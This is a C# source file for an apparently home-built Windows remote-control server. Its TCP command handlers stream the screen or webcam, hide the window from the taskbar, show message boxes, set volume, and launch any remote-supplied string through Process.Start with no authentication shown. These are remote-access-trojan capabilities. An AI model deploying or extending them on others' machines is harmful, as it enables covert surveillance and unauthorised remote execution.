using System.Diagnostics;
using Tool.Models;
using Tool.Streaming;
using AudioSwitcher.AudioApi.CoreAudio;

namespace Tool
{
    public partial class Server : Form
    {
        private async void PingCommandHandler(CommandPacket _command, System.Net.Sockets.TcpClient _client)
        {
            await _ServerNetwork.SendResponseAsync(_client, new ResponsePacket
            {
                Name = _command.Name,
                Status = "success",
                Message = "Pong!"
            });
        }

        private async void StreamCommandHandler(CommandPacket _command, System.Net.Sockets.TcpClient _client)
        {
            ResponsePacket response = new ResponsePacket { Name = _command.Name, Status = "success" };

            if (_command.Flags.Count > 0) SetStreamSource(_command.Flags[0]);

            switch (_command.Action)
            {
                case "start":
                    _StreamServer.ToggleStreaming(true);
                    response.Message = $"Stream started using {_StreamServer.CurrentSource}";
                    break;

                case "stop":
                    _StreamServer.ToggleStreaming(false);
                    response.Message = "Stream paused.";
                    break;

                default:
                    response.Status = "error";
                    response.Message = $"Unknown stream action: {_command.Action}";
                    break;
            }

            await _ServerNetwork.SendResponseAsync(_client, response);
        }

        private bool SetStreamSource(string _source)
        {
            StreamingServer.StreamSource newSource;
            switch (_source.ToLower())
            {
                case "screen": newSource = StreamingServer.StreamSource.Screen; break;
                case "webcam": newSource = StreamingServer.StreamSource.Webcam; break;
                default: return false;
            }
            _StreamServer.SetSource(newSource);
            return true;
        }

        private async void MessageCommandHandler(CommandPacket _command, System.Net.Sockets.TcpClient _client)
        {
            _ = Task.Run(() =>
            {
                MessageBox.Show(_command.Action, "Incoming Message");
            });

            await _ServerNetwork.SendResponseAsync(_client, new ResponsePacket
            {
                Name = _command.Name,
                Status = "success",
                Message = "Displayed your message."
            });
        }

        private async void DisplayCommandHandler(CommandPacket _command, System.Net.Sockets.TcpClient _client)
        {
            ResponsePacket response = new ResponsePacket { Name = _command.Name, Status = "success" };

            switch (_command.Action)
            {
                case "show":
                    this.Invoke(new Action(() => {
                        this.ShowInTaskbar = true;
                        this.Show();
                        this.WindowState = FormWindowState.Normal;
                    }));
                    response.Message = "Server is showing.";
                    break;

                case "hide":
                    this.Invoke(new Action(() => {
                        this.Hide();
                        this.ShowInTaskbar = false;
                    }));
                    response.Message = "Server is hidden.";
                    break;

                default:
                    response.Message = "No action given.";
                    response.Status = "error";
                    break;
            }

            await _ServerNetwork.SendResponseAsync(_client, response);
        }

        private async void WebCommandHandler(CommandPacket _command, System.Net.Sockets.TcpClient _client)
        {
            try
            {
                Process.Start(new ProcessStartInfo { FileName = _command.Action, UseShellExecute = true });
                await _ServerNetwork.SendResponseAsync(_client, new ResponsePacket { Name = _command.Name, Status = "success", Message = "Opened URL." });
            }
            catch (Exception ex)
            {
                await _ServerNetwork.SendResponseAsync(_client, new ResponsePacket { Name = _command.Name, Status = "error", Message = ex.Message });
            }
        }

        private async void VolumeCommandHandler(CommandPacket _command, System.Net.Sockets.TcpClient _client)
        {
            var defaultPlaybackDevice = new CoreAudioController().DefaultPlaybackDevice;
            ResponsePacket response = new ResponsePacket { Name = _command.Name, Status = "success" };

            switch (_command.Action)
            {
                case "mute":
                    if (_command.Flags.Contains("get"))
                    {
                        response.Message = "Mute is currently: " + (defaultPlaybackDevice.IsMuted ? "muted." : "unmuted.");
                    }
                    else if (_command.Flags.Contains("toggle"))
                    {
                        defaultPlaybackDevice.ToggleMute();
                        response.Message = "Toggled mute to: " + (defaultPlaybackDevice.IsMuted ? "muted." : "unmuted.");
                    }
                    else if (_command.Flags.Contains("set") && _command.Flags.Count > 1)
                    {
                        bool shouldMute = _command.Flags[1].ToLower() == "true";

                        defaultPlaybackDevice.Mute(shouldMute);


                        response.Message = "Set mute to: " + (shouldMute ? "muted." : "unmuted.");
                    }
                    break;

                case "set":
                    if (_command.Flags.Count > 0 && int.TryParse(_command.Flags[0], out int flag))
                    {
                        int volume = Math.Clamp(flag, 0, 100);
                        defaultPlaybackDevice.Volume = volume;
                        response.Message = "Set volume to: " + volume + ".";
                    }
                    else
                    {
                        response.Status = "error";
                        response.Message = "Invalid volume level.";
                    }
                    break;

                default:
                    response.Status = "error";
                    response.Message = "Unknown volume action.";
                    break;
            }

            await _ServerNetwork.SendResponseAsync(_client, response);
        }
    }
}